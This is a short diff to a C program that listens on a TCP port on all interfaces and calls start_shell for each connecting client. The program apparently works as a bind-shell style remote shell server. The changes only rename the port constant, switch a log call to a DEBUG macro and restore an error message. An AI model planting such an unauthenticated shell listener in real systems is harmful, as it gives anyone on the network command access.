@@ -15,8 +15,6 @@
 
 #include "shell.h"
 
-#define PORT 61043
-
 int main() {
     int listen_sock, conn_sock;
     struct sockaddr_in addr;
@@ -29,7 +27,7 @@ int main() {
     }
 
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(PORT);
+    addr.sin_port = htons(SHELL_SERVER_PORT);
     addr.sin_addr.s_addr = INADDR_ANY;
 
     if (bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
@@ -44,7 +42,7 @@ int main() {
         exit(1);
     }
 
-    printf("Listening on port %d...\n", PORT);
+    DEBUG("Listening on port %d...\n", SHELL_SERVER_PORT);
 
     while (1) {
         conn_sock = accept(listen_sock, (struct sockaddr *)&addr, &addr_len);
@@ -54,8 +52,7 @@ int main() {
         }
 
         if (start_shell(conn_sock, (struct sockaddr *)&addr) < 0) {
-            //perror("start_shell");
-            // noop
+            perror("start_shell");
         }
 
         close(conn_sock);
